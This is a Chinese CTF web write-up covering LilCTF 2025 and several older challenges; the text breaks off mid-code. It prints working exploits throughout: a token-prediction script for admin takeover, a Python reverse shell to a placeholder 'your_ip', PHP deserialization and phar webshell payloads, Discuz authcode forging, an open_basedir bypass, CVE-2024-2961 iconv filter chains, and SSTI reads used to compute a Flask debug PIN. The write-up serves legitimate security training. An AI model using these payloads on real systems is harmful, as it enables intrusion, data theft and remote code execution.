实现了基本的注册，登录，忘记密码等功能，主要漏洞出在忘记密码的部分，使用了uuid.uuid8来生成token，而其中调用了random生成了伪随机数，题目还给了/server_info来获取时间戳SERVER_START_TIME，admin用户名、邮箱以及padding算法都在源码中，只要模拟生成一次token就可以实现修改admin的密码实现越权，起一个python3.14的环境就能获取到uuid.uuid8了：\nimport random import uuid from secrets import token_urlsafe def padding(input_string): byte_string = input_string.encode(\u0026#39;utf-8\u0026#39;) if len(byte_string) \u0026gt; 6: byte_string = byte_string[:6] padded_byte_string = byte_string.ljust(6, b\u0026#39;\\x00\u0026#39;) padded_int = int.from_bytes(padded_byte_string, byteorder=\u0026#39;big\u0026#39;) return padded_int SERVER_START_TIME = 1755253132.849335 random.seed(SERVER_START_TIME) admin_super_strong_password = token_urlsafe() a = padding(\u0026#34;admin\u0026#34;) token = uuid.uuid8(a=a) print(token) 登陆成功后考虑如何修改time_api来让date\u0026gt;=2066，可以使用在线的自定义api网站自定义返回json数据，https://app.beeceptor.com/ ：\n{\u0026#34;date\u0026#34;:\u0026#34;2066-01-01T00:00:00\u0026#34;} /admin/settings中填入自定义的api：https://lilctf.free.beeceptor.com/api/date ，再访问/execute_command即可实现RCE。但是由于执行的是os.system()，网页是没有回显的，尝试反弹shell，一开始用bash和nc反弹都失败了还以为不出网，最后尝试python反弹shell成功：\npython -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;your_ip\u0026#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; flag在根目录下：LILCTF{U_HAvE_1OUnD_TH3_rIgH7_tlMEIINE!}\n参考资料：\nhttps://xz.aliyun.com/news/8987\nYour Uns3r index.php：\n\u0026lt;?php highlight_file(__FILE__); class User { public $username; public $value; public function exec() { $ser = unserialize(serialize(unserialize($this-\u0026gt;value))); if ($ser != $this-\u0026gt;value \u0026amp;\u0026amp; $ser instanceof Access) { include($ser-\u0026gt;getToken()); } } public function __destruct() { if ($this-\u0026gt;username == \u0026#34;admin\u0026#34;) { $this-\u0026gt;exec(); } } } class Access { protected $prefix; protected $suffix; public function getToken() { if (!is_string($this-\u0026gt;prefix) || !is_string($this-\u0026gt;suffix)) { throw new Exception(\u0026#34;Go to HELL!\u0026#34;); } $result = $this-\u0026gt;prefix . \u0026#39;lilctf\u0026#39; . $this-\u0026gt;suffix; if (strpos($result, \u0026#39;pearcmd\u0026#39;) !== false) { throw new Exception(\u0026#34;Can I have peachcmd?\u0026#34;); } return $result; } } $ser = $_POST[\u0026#34;user\u0026#34;]; if (strpos($ser, \u0026#39;admin\u0026#39;) !== false \u0026amp;\u0026amp; strpos($ser, \u0026#39;Access\u0026#34;:\u0026#39;) !== false) { exit (\u0026#34;no way!!!!\u0026#34;); } $user = unserialize($ser); throw new Exception(\u0026#34;nonono!!!\u0026#34;); 反序列化的目的是实现include的任意文件读取，可以利用目录穿越，设置好prefix和suffix即可：\nclass Access { protected $prefix = \u0026#34;/\u0026#34;; protected $suffix = \u0026#34;../../../../../flag\u0026#34;; } # include(\u0026#34;/lilctf/../../../../../flag\u0026#34;); 反序列化字符串中一定会出现Access，第一个要绕过的就是User中不能设置username为admin，否则无法进行反序列化，但是__destruct()又要求$this-\u0026gt;username == \u0026quot;admin\u0026quot;为真才执行exec()，可以利用true的弱比较特性来绕过：\nclass User { public $username = true; # true与非空字符串进行弱比较返回true public $value; } $ser = unserialize(serialize(unserialize($this-\u0026gt;value)));和下面的判断$ser != $this-\u0026gt;value \u0026amp;\u0026amp; $ser instanceof Access看上去有点绕，实际上按照正常的逻辑，$this-\u0026gt;value是序列化后的ser，即serialize(new Access())，符合所有条件，根本没有什么需要绕过的地方\n此时已经能写出完整的exp：\n\u0026lt;?php class User { public $username = true; public $value; } class Access { protected $prefix = \u0026#34;/\u0026#34;; protected $suffix = \u0026#34;../../../../../flag\u0026#34;; } $a = new User(); $b = new Access(); $a-\u0026gt;value = serialize($b); print (urlencode(serialize($a))); ?\u0026gt; 最后还有一个需要绕过的点，throw new Exception(\u0026quot;nonono!!!\u0026quot;);会在__destruct()触发前就抛出异常，导致无法执行析构函数，也就无法读取/flag，直接将序列化结果最后的}删去即可触发fast_destruct绕过throw：\nuser=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A5%3A%22value%22%3Bs%3A84%3A%22O%3A6%3A%22Access%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A1%3A%22%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B LILCTF{90NNa_f1ND_y#UR_@NsW3r_7o_UNseR}\n参考资料：\nhttps://www.wangan.com/p/7fy7f46cd2c8727f#fastdestruct%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n我曾有一份工作 flag 在 pre_a_flag 表里\nDiscuz! X3.5，www.zip有备份源码，先下载下来看看配置目录config，根据修改时间排除deafult中同名的信息：\ndefine(\u0026#39;UC_KEY\u0026#39;, \u0026#39;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb\u0026#39;);\t// 与 UCenter 的通信密钥, 要与 UCenter 保持一致 通过UC_KEY可以计算_authcode，dbbak.php：\n$timestamp = time(); if($timestamp - $get[\u0026#39;time\u0026#39;] \u0026gt; 3600) { exit(\u0026#39;Authorization has expired\u0026#39;); } ... if($get[\u0026#39;method\u0026#39;] == \u0026#39;export\u0026#39;) { $db-\u0026gt;query(\u0026#39;SET SQL_QUOTE_SHOW_CREATE=0\u0026#39;, \u0026#39;SILENT\u0026#39;); $time = date(\u0026#34;Y-m-d H:i:s\u0026#34;, $timestamp); $tables = array(); $tables = arraykeys2(fetchtablelist($tablepre), \u0026#39;Name\u0026#39;); if($apptype == \u0026#39;discuz\u0026#39;) { $query = $db-\u0026gt;query(\u0026#34;SELECT datatables FROM {$tablepre}plugins WHERE datatables\u0026lt;\u0026gt;\u0026#39;\u0026#39;\u0026#34;); while($plugin = $db-\u0026gt;fetch_array($query)) { foreach(explode(\u0026#39;,\u0026#39;, $plugin[\u0026#39;datatables\u0026#39;]) as $table) { if($table = trim($table)) { $tables[] = $table; } } } } if($apptype == \u0026#39;discuzx\u0026#39;) { $query = $db-\u0026gt;query(\u0026#34;SELECT datatables FROM {$tablepre}common_plugin WHERE datatables\u0026lt;\u0026gt;\u0026#39;\u0026#39;\u0026#34;); while($plugin = $db-\u0026gt;fetch_array($query)) { foreach(explode(\u0026#39;,\u0026#39;, $plugin[\u0026#39;datatables\u0026#39;]) as $table) { if($table = trim($table)) { $tables[] = $table; } } } } ... function encode_arr($get) { $tmp = \u0026#39;\u0026#39;; foreach($get as $key =\u0026gt; $val) { $tmp .= \u0026#39;\u0026amp;\u0026#39;.$key.\u0026#39;=\u0026#39;.$val; } return _authcode($tmp, \u0026#39;ENCODE\u0026#39;, UC_KEY); } ... function _authcode($string, $operation = \u0026#39;DECODE\u0026#39;, $key = \u0026#39;\u0026#39;, $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : UC_KEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == \u0026#39;DECODE\u0026#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : \u0026#39;\u0026#39;; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == \u0026#39;DECODE\u0026#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(\u0026#39;%010d\u0026#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = \u0026#39;\u0026#39;; $box = range(0, 255); $rndkey = array(); for($i = 0; $i \u0026lt;= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i \u0026lt; 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i \u0026lt; $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == \u0026#39;DECODE\u0026#39;) { if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() \u0026gt; 0) \u0026amp;\u0026amp; substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return \u0026#39;\u0026#39;; } } else { return $keyc.str_replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;, base64_encode($result)); } } $next_url = (is_https() ? \u0026#39;https\u0026#39; : \u0026#39;http\u0026#39;).\u0026#39;://\u0026#39;.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].$_SERVER[\u0026#39;PHP_SELF\u0026#39;].\u0026#39;?apptype=\u0026#39;.$GLOBALS[\u0026#39;apptype\u0026#39;].\u0026#39;\u0026amp;code=\u0026#39;.urlencode(encode_arr($get)); 可以看到需要传入apptype，这里用的是discuzX，应该传入参数值discuzx，还需要传入code，可以发现$get里比较重要的两个键值对是time和method，并且code有1小时的有效期，先尝试生成一个：\n\u0026lt;?php function _authcode($string, $operation = \u0026#39;DECODE\u0026#39;, $key = \u0026#39;\u0026#39;, $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : UC_KEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == \u0026#39;DECODE\u0026#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : \u0026#39;\u0026#39;; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == \u0026#39;DECODE\u0026#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(\u0026#39;%010d\u0026#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = \u0026#39;\u0026#39;; $box = range(0, 255); $rndkey = array(); for($i = 0; $i \u0026lt;= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i \u0026lt; 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i \u0026lt; $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == \u0026#39;DECODE\u0026#39;) { if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() \u0026gt; 0) \u0026amp;\u0026amp; substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return \u0026#39;\u0026#39;; } } else { return $keyc.str_replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;, base64_encode($result)); } } $UC_KEY = \u0026#34;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb\u0026#34;; $tmp = \u0026#34;time=\u0026#34;.time().\u0026#34;\u0026amp;method=export\u0026#34;; $code = urlencode(_authcode($tmp, \u0026#39;ENCODE\u0026#39;, $UC_KEY)); print($code); ?\u0026gt; payload：\nhttp://challenge.xinshi.fun:43672/api/db/dbbak.php?apptype=discuzx\u0026amp;code=7e6boiAfroxp9Fuy7oIpRV3cXkVfPwg9zOKPJNuyuUTlr3UsJzuwez0yqdCPZmRqTPp6RVSTsKUL3w 网页回显：\n\u0026lt;root\u0026gt; \u0026lt;error errorCode=\u0026#34;0\u0026#34; errorMessage=\u0026#34;ok\u0026#34;/\u0026gt; \u0026lt;fileinfo\u0026gt; \u0026lt;file_num\u0026gt;1\u0026lt;/file_num\u0026gt; \u0026lt;file_size\u0026gt;1999894\u0026lt;/file_size\u0026gt; \u0026lt;file_name\u0026gt;250828_mp6bJ6-1.sql\u0026lt;/file_name\u0026gt; \u0026lt;file_url\u0026gt; http://challenge.xinshi.fun:43672/data/backup_250828_B0yInW/250828_mp6bJ6-1.sql \u0026lt;/file_url\u0026gt; \u0026lt;last_modify\u0026gt;1756381296\u0026lt;/last_modify\u0026gt; \u0026lt;/fileinfo\u0026gt; \u0026lt;nexturl\u0026gt; http://challenge.xinshi.fun:43672/api/db/dbbak.php?apptype=discuzx\u0026amp;code=9190Bmhg8Qj40j7JucTh7pcdbHXbfpQBB8nCbL1K53hukNft8CQNrD1iPSqVq0kYH7kd5%2F2NRBDsBy0HcWelImYQEYXjaERQK9PL0zoOJvvdx0ag3B5K55Y3D%2F8SrsYBxncKlQWZ0s1spkg90he06%2BnV2fgL9XKNUY2ysELgL3a29NApEUofoiX5pjktVkHQqMDbsHWLKIyj \u0026lt;/nexturl\u0026gt; \u0026lt;/root\u0026gt; sql代码里找到两句INSERT语句：\nINSERT INTO pre_a_flag VALUES (\u0026#39;1\u0026#39;,0x666c61677b746573745f666c61677d); INSERT INTO pre_a_flag VALUES (\u0026#39;2\u0026#39;,0x4c494c4354467b686176455f7923755f3123754e445f345f4a4f365f4e23773f5f6841484068417d); 解hex得到flag：LILCTF{havE_y#u_1#uND_4_JO6_N#w?_hAH@hA}\n参考资料：\nhttps://mp.weixin.qq.com/s/IDkUpjPL0mzSxKOgldHPeQ\nhttps://guokeya.github.io/post/87yhVz7uW/\nphp_jail_is_my_cry 请注意附件中的代码存在一行需要你补充的代码, 已经注释表明, 否则会存在问题\r最终需要执行 /readflag\r并没有开启 allow_url_include\rindex.php：\n\u0026lt;?php if (isset($_POST[\u0026#39;url\u0026#39;])) { $url = $_POST[\u0026#39;url\u0026#39;]; $file_name = basename($url); $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if ($data) { file_put_contents(\u0026#39;/tmp/\u0026#39;.$file_name, $data); echo \u0026#34;文件已下载: \u0026lt;a href=\u0026#39;?down=$file_name\u0026#39;\u0026gt;$file_name\u0026lt;/a\u0026gt;\u0026#34;; } else { echo \u0026#34;下载失败。\u0026#34;; } } if (isset($_GET[\u0026#39;down\u0026#39;])){ include \u0026#39;/tmp/\u0026#39; . basename($_GET[\u0026#39;down\u0026#39;]); exit; } // 上传文件 if (isset($_FILES[\u0026#39;file\u0026#39;])) { $target_dir = \u0026#34;/tmp/\u0026#34;; $target_file = $target_dir . basename($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $orig = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $ch = curl_init(\u0026#39;file://\u0026#39;. $orig); // I hide a trick to bypass open_basedir, I\u0026#39;m sure you can find it. curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if (stripos($data, \u0026#39;\u0026lt;?\u0026#39;) === false \u0026amp;\u0026amp; stripos($data, \u0026#39;php\u0026#39;) === false \u0026amp;\u0026amp; stripos($data, \u0026#39;halt\u0026#39;) === false) { file_put_contents($target_file, $data); } else { echo \u0026#34;存在 `\u0026lt;?` 或者 `php` 或者 `halt` 恶意字符!\u0026#34;; $data = null; } } ?\u0026gt; 将phar打包为gz绕过恶意字符检测，实现上传马：\n\u0026lt;?php $phar = new Phar(\u0026#39;exploit.phar\u0026#39;); $phar-\u0026gt;startBuffering(); $stub = \u0026lt;\u0026lt;\u0026lt;\u0026#39;STUB\u0026#39; \u0026lt;?php @eval($_REQUEST[1]); __HALT_COMPILER(); ?\u0026gt; STUB; $phar-\u0026gt;setStub($stub); $phar-\u0026gt;addFromString(\u0026#39;test.txt\u0026#39;, \u0026#39;test\u0026#39;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 测试payload：http://gz.imxbt.cn:20647/?down=exploit.phar.gz\u0026amp;1=phpinfo();\ndisable_functions禁用了大部分函数\n本题php.ini中设置了open_basedir = /var/www/html:/tmp，但curl_init仍然使用了file协议：\nNote:\rThe file protocol is disabled by cURL if open_basedir is set. 根据这个issue：https://github.com/php/php-src/issues/16802 可以知道bypass open_basedir的方法：\n$ch = curl_init(\u0026#34;file:///etc/passwd\u0026#34;);curl_setopt($ch, CURLOPT_PROTOCOLS_STR, \u0026#34;all\u0026#34;);curl_exec($ch); 实现任意文件读取payload：\nhttp://gz.imxbt.cn:20647/?down=exploit.phar.gz\u0026amp;1=$ch%20=%20curl_init(%22file:///etc/passwd%22);curl_setopt($ch,%20CURLOPT_PROTOCOLS_STR,%20%22all%22);curl_exec($ch); 尝试打CVE-2024-2961，大致原理是glibc中iconv()函数将一些数据转换成ISO-2022-CN-EXT格式时，会有1-3字节的溢出，利用步骤如下：\n1.获取 /proc/self/maps\r2.获取libc\r3.生成payload 先获取/proc/self/maps文件：\nhttp://gz.imxbt.cn:20647/?down=exploit.phar.gz\u0026amp;1=$ch%20=%20curl_init(%22file:///proc/self/maps%22);curl_setopt($ch,%20CURLOPT_PROTOCOLS_STR,%20%22all%22);curl_exec($ch) 从docker中获取libc.so.6文件：\nfind / -name \u0026#34;libc.so.6\u0026#34; docker cp pjimc:/usr/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6 利用kezibei的脚本，设置好要执行的命令/readflag \u0026gt; /tmp/flag生成payload：\nphp://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXcdJjExG2hLX3M58c8bzCrZ8wI%2b6wYIxCPLPYmh3q3x/cbGLdMGvVsi7N2viV/9JLr3ROXX7q2lYmBrzAoDX15mOt7auvGK7efiNLt7j7SQN%2bDQw%2bSZHfdpx6q1V65pXutqjTd5QsFQjomBwxzXZd0W4v2c1V3WuvGW334OMgYMXTfVt2eO0Faog6r35g/uOw/3t%2bfPjoe/vVpq271va/3Ziz/vv/V81qkq%2bn7jvPLzXxjw0BB3yo/76mcJq7dOqZa2K3V%2be9zq623b41tz%2b1em/%2b1nmPZ%2b/a%2bvtb1L%2bf34v//t5/3f2TLjNeww6I7/xfYtvw59/lrwyffvcnf0vufVt6f978bc8fy6zfdfdVWfy239ufH/18%2b%2b3Psr2/Xs65t%2b/2u/zrR3fZvrK8tj039n9MTfX9uO2va6e93Zl3/vnX/sq/u%2b59/hyf/Wnp%2b3X8Vf9vz/o4ofiwwb4Ul0%2bf2QjEXW9qZuHUqqlWaVvdZt58v/%2bv1MmPBEIiweLbiQjjKvvFrjNdVP6yjyoeVTyqmM6KZ9wLyj6z5W7qm2%2b5U1S9VI4TyrJV3msNL5dN33h7e%2bA0jYky%2bEsnhoaXuluP%2bdyOPZZ33y1ykUsRDwHjl229Iha%2b8qPp3W/K%2bean2n/s%2b/PpZ/t8706O44wE3BXlnVs4VSr%2bcq591hR%2bMcE%2bAg47sGXarUdapvuW3a67oiGvo/SPAQA= 利用file_put_contents来实现执行命令：\nhttp://gz.imxbt.cn:20647/?down=exploit.phar.gz\u0026amp;1=file_put_contents(\u0026#34;php://filter/write=convert.base64-decode|zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=test.php\u0026#34;,\u0026#34;e3vXcdJjExG2hLX3M58c8bzCrZ8wI%2b6wYIxCPLPYmh3q3x/cbGLdMGvVsi7N2viV/9JLr3ROXX7q2lYmBrzAoDX15mOt7auvGK7efiNLt7j7SQN%2bDQw%2bSZHfdpx6q1V65pXutqjTd5QsFQjomBwxzXZd0W4v2c1V3WuvGW334OMgYMXTfVt2eO0Faog6r35g/uOw/3t%2bfPjoe/vVpq271va/3Ziz/vv/V81qkq%2bn7jvPLzXxjw0BB3yo/76mcJq7dOqZa2K3V%2be9zq623b41tz%2b1em/%2b1nmPZ%2b/a%2bvtb1L%2bf34v//t5/3f2TLjNeww6I7/xfYtvw59/lrwyffvcnf0vufVt6f978bc8fy6zfdfdVWfy239ufH/18%2b%2b3Psr2/Xs65t%2b/2u/zrR3fZvrK8tj039n9MTfX9uO2va6e93Zl3/vnX/sq/u%2b59/hyf/Wnp%2b3X8Vf9vz/o4ofiwwb4Ul0%2bf2QjEXW9qZuHUqqlWaVvdZt58v/%2bv1MmPBEIiweLbiQjjKvvFrjNdVP6yjyoeVTyqmM6KZ9wLyj6z5W7qm2%2b5U1S9VI4TyrJV3msNL5dN33h7e%2bA0jYky%2bEsnhoaXuluP%2bdyOPZZ33y1ykUsRDwHjl229Iha%2b8qPp3W/K%2bean2n/s%2b/PpZ/t8706O44wE3BXlnVs4VSr%2bcq591hR%2bMcE%2bAg47sGXarUdapvuW3a67oiGvo/SPAQA=\u0026#34;); 读取flag：http://gz.imxbt.cn:20647/?down=flag\nLILCTF{ada29630-db49-4f0d-8f11-097b10c488c3}\n参考资料：\nhttps://github.com/ambionics/cnext-exploits/\nhttps://github.com/kezibei/php-filter-iconv\n","permalink":"https://blog.w8nn9z.top/posts/ctf/lilctf-2025-web-writeup/","summary":"","title":"LilCTF 2025 WEB Writeup"},{"content":"[GYCTF2020]FlaskApp decode路由存在SSTI，如果直接获取__subclasses__()，由于资源太多导致网站直接502了，尝试一次获取100个，找到os._wrap_close：\n{{().__class__.__bases__[0].__subclasses__()[127]}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbMTI3XX19 但是过滤了system，由于flask开启了debug，考虑获取PIN码，先获取_frozen_importlib位置：\n{{().__class__.__bases__[0].__subclasses__()[75]}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdfX0= 获取username：\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[\u0026#39;open\u0026#39;](\u0026#39;/etc/passwd\u0026#39;).read()}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19\rroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh 获取/etc/machine-id：\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[\u0026#39;open\u0026#39;](\u0026#39;/etc/machine-id\u0026#39;).read()}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL21hY2hpbmUtaWQnKS5yZWFkKCl9fQ==\r1408f836b0ca514d796cbf8960e45fa1 获取uuidnode：\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[\u0026#39;open\u0026#39;](\u0026#39;/sys/class/net/eth0/address\u0026#39;).read()}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvc3lzL2NsYXNzL25ldC9ldGgwL2FkZHJlc3MnKS5yZWFkKCl9fQ==\rd2:7b:56:a5:0e:2d 对应十进制数值为231427176468013 报错获取app.py绝对路径：\n/usr/local/lib/python3.7/site-packages/flask/app.py 算出PIN码255-971-270，访问console路由进行rce：\n__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /this_is_the_flag.txt\u0026#39;).read()\r\u0026#39;flag{df780c8c-7265-468e-bfce-c04079d78e67}\\n\u0026#39; 参考文章：\nhttps://www.freebuf.com/articles/web/359392.html\nhttps://xz.aliyun.com/news/2235#toc-2\n[FBCTF2019]RCEService 原题给了源码：\n\u0026lt;?php putenv(\u0026#39;PATH=/home/rceservice/jail\u0026#39;); if (isset($_REQUEST[\u0026#39;cmd\u0026#39;])) { $json = $_REQUEST[\u0026#39;cmd\u0026#39;]; if (!is_string($json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } elseif (preg_match(\u0026#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/\u0026#39;, $json)) { echo \u0026#39;Hacking attempt detected\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } else { echo \u0026#39;Attempting to run command:\u0026lt;br/\u0026gt;\u0026#39;; $cmd = json_decode($json, true)[\u0026#39;cmd\u0026#39;]; if ($cmd !== NULL) { system($cmd); } else { echo \u0026#39;Invalid input\u0026#39;; } echo \u0026#39;\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026#39;; } } ?\u0026gt; 由于preg_match匹配开头和结尾为除换行符以外的所有字符，所以可以尝试换行符%0A绕过：\n?cmd={%0a\u0026#34;cmd\u0026#34;:\u0026#34;ls%20/\u0026#34;%0a} 匹配到开头为{，中间为%0a，由于后面还有一个%0a，不满足.*$，所以匹配结果为false，但是php的preg_match好像不会管字符串最后的换行符\n找出flag位置，由于设置了PATH，用绝对路径执行命令即可：\n?cmd={%0a\u0026#34;cmd\u0026#34;:\u0026#34;ls%20/home/rceservice\u0026#34;%0a}\rflag\rjail\r?cmd={%0a\u0026#34;cmd\u0026#34;:\u0026#34;/bin/cat%20/home/rceservice/flag\u0026#34;%0a}\rflag{24ba5085-75cf-45bd-aef3-46ffa53a6018} 在线匹配正则的网站\n[Zer0pts2020]Can you guess it? \u0026lt;?php include \u0026#39;config.php\u0026#39;; // FLAG is defined in config.php if (preg_match(\u0026#39;/config\\.php\\/*$/i\u0026#39;, $_SERVER[\u0026#39;PHP_SELF\u0026#39;])) { exit(\u0026#34;I don\u0026#39;t know what you are thinking, but I won\u0026#39;t let you read it :)\u0026#34;); } if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;])); exit(); } $secret = bin2hex(random_bytes(64)); if (isset($_POST[\u0026#39;guess\u0026#39;])) { $guess = (string) $_POST[\u0026#39;guess\u0026#39;]; if (hash_equals($secret, $guess)) { $message = \u0026#39;Congratulations! The flag is: \u0026#39; . FLAG; } else { $message = \u0026#39;Wrong.\u0026#39;; } } ?\u0026gt; 利用basename的漏洞：\n/index.php/config.php/%ff?source\r\u0026lt;?php\rdefine(\u0026#39;FLAG\u0026#39;, \u0026#39;flag{f7488202-3627-4482-8c75-39fa925f8d72}\u0026#39;); 参考文章：\nhttps://blog.51cto.com/xunansec/5356203\n[0CTF 2016]piapiapia www.zip源码泄露\nindex.php：\n\u0026lt;?php require_once(\u0026#39;class.php\u0026#39;); if($_SESSION[\u0026#39;username\u0026#39;]) { header(\u0026#39;Location: profile.php\u0026#39;); exit; } if($_POST[\u0026#39;username\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;]) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; if(strlen($username) \u0026lt; 3 or strlen($username) \u0026gt; 16) die(\u0026#39;Invalid user name\u0026#39;); if(strlen($password) \u0026lt; 3 or strlen($password) \u0026gt; 16) die(\u0026#39;Invalid password\u0026#39;); if($user-\u0026gt;login($username, $password)) { $_SESSION[\u0026#39;username\u0026#39;] = $username; header(\u0026#39;Location: profile.php\u0026#39;); exit;\t} else { die(\u0026#39;Invalid user name or password\u0026#39;); } } else 